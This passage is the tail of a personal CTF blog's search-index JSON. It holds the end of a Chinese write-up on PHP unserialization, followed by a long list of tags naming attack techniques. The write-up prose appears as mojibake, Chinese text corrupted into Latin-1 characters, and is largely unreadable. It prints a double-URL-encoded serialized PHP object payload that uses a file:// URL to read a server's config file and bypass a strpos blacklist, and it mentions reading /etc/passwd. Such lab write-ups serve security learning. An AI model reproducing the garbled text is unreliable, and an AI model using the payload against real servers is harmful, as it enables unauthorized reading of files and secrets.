/etc/passwd æ–‡ä»¶äº†ã€‚ä¸‹é¢è¦ç»•è¿‡é»‘åå•äº†ã€‚æœäº†ä¸€ä¸‹ï¼ŒGoogle php strpos bypassï¼Œå‡ºäº†ä¸€ä¸ª CVEã€‚ä¸¤æ¬¡ç¼–ç å³å¯ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦å¯¹. ä¸¤æ¬¡ç¼–ç ã€‚. çš„ç¼–ç ä¸º %2eï¼Œå¯¹ % ç¼–ç ä¸º %25ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å†™æ–‡ä»¶åä¸º config%252ephpã€‚è€Œè·¯å¾„é¢˜ç›®å·²ç»æç¤ºäº† /app/publicã€‚ é‡ç‚¹æ¥äº†ï¼Œæ­£å¸¸ serialize ååº”è¯¥æ˜¯å¦‚ä¸‹ç»“æœï¼šO%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fapp%2Fpublic%2Fconfig.%252570hp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7Dï¼ˆURL ç¼–ç è¿‡äº†ï¼‰ã€‚è¿™ä¸ªç»“æœåœ¨å…¶ä»– Writeup ä¸Šæ²¡ä»€ä¹ˆé—®é¢˜ï¼Œæˆ‘æœ¬åœ°æµ‹è¯•çš„æ—¶å€™é—®é¢˜å¤§äº†ã€‚æ­£å¸¸çš„æµè§ˆå™¨æ²¡æœ‰æŠŠæˆ‘ä»¬çš„ %25 è§£æäº†ï¼Œè¿™å°±é€ æˆå­—ç¬¦ä¸²æ•°é‡é”™äº†ã€‚æ­£ç¡®çš„åºåˆ—åŒ–ç»“æœåº”ä¸º &#123;s:10:%22%00SHITS%00url%22;s:31:%22file:///app/public/config%252ephp%22;s:13:%22%00SHITS%00method%22;s:4:%22doit%22;s:11:%22%00SHITS%00addr%22;N;s:11:%22%00SHITS%00host%22;N;s:11:%22%00SHITS%00name%22;N;&#125;'ã€‚%25 åº”è¯¥å·²ç»åœ¨è®¿é—®çš„æ—¶å€™å°± URL Decode çš„ï¼Œä½†æ˜¯åºåˆ—åŒ–çš„æ—¶å€™æ²¡æœ‰è€ƒè™‘è¿™ç‚¹ï¼Œå› æ­¤æˆ‘ä»¬è¦æ‰‹åŠ¨æ‰£é™¤ã€‚ flag{ecf6df95-a28a-42ae-8b2b-43e9065d1e7f}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"}]}],"categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"},{"name":"Logs","slug":"Logs","permalink":"http://tiaonmmn.github.io/categories/Logs/"},{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/categories/Misc/"},{"name":"Something else","slug":"Something-else","permalink":"http://tiaonmmn.github.io/categories/Something-else/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Hack","slug":"Hack","permalink":"http://tiaonmmn.github.io/tags/Hack/"},{"name":"RCE","slug":"RCE","permalink":"http://tiaonmmn.github.io/tags/RCE/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"XXE","slug":"XXE","permalink":"http://tiaonmmn.github.io/tags/XXE/"},{"name":"SVG","slug":"SVG","permalink":"http://tiaonmmn.github.io/tags/SVG/"},{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"Session","slug":"Session","permalink":"http://tiaonmmn.github.io/tags/Session/"},{"name":"sql_mode","slug":"sql-mode","permalink":"http://tiaonmmn.github.io/tags/sql-mode/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Redis","slug":"Redis","permalink":"http://tiaonmmn.github.io/tags/Redis/"},{"name":"SSRF","slug":"SSRF","permalink":"http://tiaonmmn.github.io/tags/SSRF/"},{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/tags/Misc/"},{"name":"C#","slug":"C","permalink":"http://tiaonmmn.github.io/tags/C/"},{"name":"AES","slug":"AES","permalink":"http://tiaonmmn.github.io/tags/AES/"},{"name":"Nginx","slug":"Nginx","permalink":"http://tiaonmmn.github.io/tags/Nginx/"},{"name":"NodeJS","slug":"NodeJS","permalink":"http://tiaonmmn.github.io/tags/NodeJS/"},{"name":"åŸå‹é“¾æ±¡æŸ“","slug":"åŸå‹é“¾æ±¡æŸ“","permalink":"http://tiaonmmn.github.io/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"CTFd","slug":"CTFd","permalink":"http://tiaonmmn.github.io/tags/CTFd/"},{"name":"Flask","slug":"Flask","permalink":"http://tiaonmmn.github.io/tags/Flask/"},{"name":"Pickle","slug":"Pickle","permalink":"http://tiaonmmn.github.io/tags/Pickle/"},{"name":"ASP.NET","slug":"ASP-NET","permalink":"http://tiaonmmn.github.io/tags/ASP-NET/"},{"name":"Pipe","slug":"Pipe","permalink":"http://tiaonmmn.github.io/tags/Pipe/"},{"name":"äºŒæ¬¡æ³¨å…¥","slug":"äºŒæ¬¡æ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"},{"name":"å¼‚æˆ–æ³¨å…¥","slug":"å¼‚æˆ–æ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/"},{"name":"ç›²æ³¨","slug":"ç›²æ³¨","permalink":"http://tiaonmmn.github.io/tags/%E7%9B%B2%E6%B3%A8/"},{"name":"Phar","slug":"Phar","permalink":"http://tiaonmmn.github.io/tags/Phar/"},{"name":".user.ini","slug":"user-ini","permalink":"http://tiaonmmn.github.io/tags/user-ini/"},{"name":"Upload","slug":"Upload","permalink":"http://tiaonmmn.github.io/tags/Upload/"},{"name":"Crypto","slug":"Crypto","permalink":"http://tiaonmmn.github.io/tags/Crypto/"},{"name":"ECB","slug":"ECB","permalink":"http://tiaonmmn.github.io/tags/ECB/"},{"name":"Python.Flask","slug":"Python-Flask","permalink":"http://tiaonmmn.github.io/tags/Python-Flask/"},{"name":"Cookie","slug":"Cookie","permalink":"http://tiaonmmn.github.io/tags/Cookie/"},{"name":"LFI","slug":"LFI","permalink":"http://tiaonmmn.github.io/tags/LFI/"},{"name":"Unicode","slug":"Unicode","permalink":"http://tiaonmmn.github.io/tags/Unicode/"},{"name":"JSON","slug":"JSON","permalink":"http://tiaonmmn.github.io/tags/JSON/"},{"name":"addslashes","slug":"addslashes","permalink":"http://tiaonmmn.github.io/tags/addslashes/"},{"name":"PHP_SESSION_UPLOAD_PROGRESS","slug":"PHP-SESSION-UPLOAD-PROGRESS","permalink":"http://tiaonmmn.github.io/tags/PHP-SESSION-UPLOAD-PROGRESS/"},{"name":"Configuration","slug":"Configuration","permalink":"http://tiaonmmn.github.io/tags/Configuration/"},{"name":"Perl","slug":"Perl","permalink":"http://tiaonmmn.github.io/tags/Perl/"},{"name":"CGI","slug":"CGI","permalink":"http://tiaonmmn.github.io/tags/CGI/"},{"name":"Acunetix","slug":"Acunetix","permalink":"http://tiaonmmn.github.io/tags/Acunetix/"},{"name":"FFI","slug":"FFI","permalink":"http://tiaonmmn.github.io/tags/FFI/"},{"name":"SoapClient","slug":"SoapClient","permalink":"http://tiaonmmn.github.io/tags/SoapClient/"},{"name":"Slepp","slug":"Slepp","permalink":"http://tiaonmmn.github.io/tags/Slepp/"},{"name":"å“ˆå¸Œæ‰©å±•æ”»å‡»","slug":"å“ˆå¸Œæ‰©å±•æ”»å‡»","permalink":"http://tiaonmmn.github.io/tags/%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"},{"name":"Cherrypy","slug":"Cherrypy","permalink":"http://tiaonmmn.github.io/tags/Cherrypy/"},{"name":"CVE-2016-5699","slug":"CVE-2016-5699","permalink":"http://tiaonmmn.github.io/tags/CVE-2016-5699/"},{"name":"CRLF Injection","slug":"CRLF-Injection","permalink":"http://tiaonmmn.github.io/tags/CRLF-Injection/"},{"name":"MT19937","slug":"MT19937","permalink":"http://tiaonmmn.github.io/tags/MT19937/"},{"name":"SSTI","slug":"SSTI","permalink":"http://tiaonmmn.github.io/tags/SSTI/"},{"name":"Shell","slug":"Shell","permalink":"http://tiaonmmn.github.io/tags/Shell/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"http://tiaonmmn.github.io/tags/PHP-FPM/"},{"name":"RSync","slug":"RSync","permalink":"http://tiaonmmn.github.io/tags/RSync/"},{"name":"escapeshellarg","slug":"escapeshellarg","permalink":"http://tiaonmmn.github.io/tags/escapeshellarg/"},{"name":"escapeshellcmd","slug":"escapeshellcmd","permalink":"http://tiaonmmn.github.io/tags/escapeshellcmd/"},{"name":"å‘½ä»¤æ³¨å…¥","slug":"å‘½ä»¤æ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"},{"name":"Forensic","slug":"Forensic","permalink":"http://tiaonmmn.github.io/tags/Forensic/"},{"name":"Windows","slug":"Windows","permalink":"http://tiaonmmn.github.io/tags/Windows/"},{"name":"Volatility","slug":"Volatility","permalink":"http://tiaonmmn.github.io/tags/Volatility/"},{"name":"SID","slug":"SID","permalink":"http://tiaonmmn.github.io/tags/SID/"},{"name":"Laravel","slug":"Laravel","permalink":"http://tiaonmmn.github.io/tags/Laravel/"},{"name":"Blade","slug":"Blade","permalink":"http://tiaonmmn.github.io/tags/Blade/"},{"name":"RuCTF","slug":"RuCTF","permalink":"http://tiaonmmn.github.io/tags/RuCTF/"},{"name":"Sanic","slug":"Sanic","permalink":"http://tiaonmmn.github.io/tags/Sanic/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://tiaonmmn.github.io/tags/MongoDB/"},{"name":"TCPDF","slug":"TCPDF","permalink":"http://tiaonmmn.github.io/tags/TCPDF/"},{"name":"Tornado","slug":"Tornado","permalink":"http://tiaonmmn.github.io/tags/Tornado/"},{"name":"å †å æ³¨å…¥","slug":"å †å æ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"},{"name":"mb_substr","slug":"mb-substr","permalink":"http://tiaonmmn.github.io/tags/mb-substr/"},{"name":"mb_strpos","slug":"mb-strpos","permalink":"http://tiaonmmn.github.io/tags/mb-strpos/"},{"name":"Stego","slug":"Stego","permalink":"http://tiaonmmn.github.io/tags/Stego/"},{"name":"USB","slug":"USB","permalink":"http://tiaonmmn.github.io/tags/USB/"},{"name":"æ‰“å°æœº","slug":"æ‰“å°æœº","permalink":"http://tiaonmmn.github.io/tags/%E6%89%93%E5%8D%B0%E6%9C%BA/"},{"name":"Hexo","slug":"Hexo","permalink":"http://tiaonmmn.github.io/tags/Hexo/"},{"name":"nip.io","slug":"nip-io","permalink":"http://tiaonmmn.github.io/tags/nip-io/"},{"name":"Regex","slug":"Regex","permalink":"http://tiaonmmn.github.io/tags/Regex/"},{"name":"Balabala","slug":"Balabala","permalink":"http://tiaonmmn.github.io/tags/Balabala/"},{"name":"LD_PRELOAD","slug":"LD-PRELOAD","permalink":"http://tiaonmmn.github.io/tags/LD-PRELOAD/"},{"name":"disable_functions","slug":"disable-functions","permalink":"http://tiaonmmn.github.io/tags/disable-functions/"},{"name":"f-string","slug":"f-string","permalink":"http://tiaonmmn.github.io/tags/f-string/"},{"name":"Data URI Scheme","slug":"Data-URI-Scheme","permalink":"http://tiaonmmn.github.io/tags/Data-URI-Scheme/"},{"name":"CakePHP","slug":"CakePHP","permalink":"http://tiaonmmn.github.io/tags/CakePHP/"}]}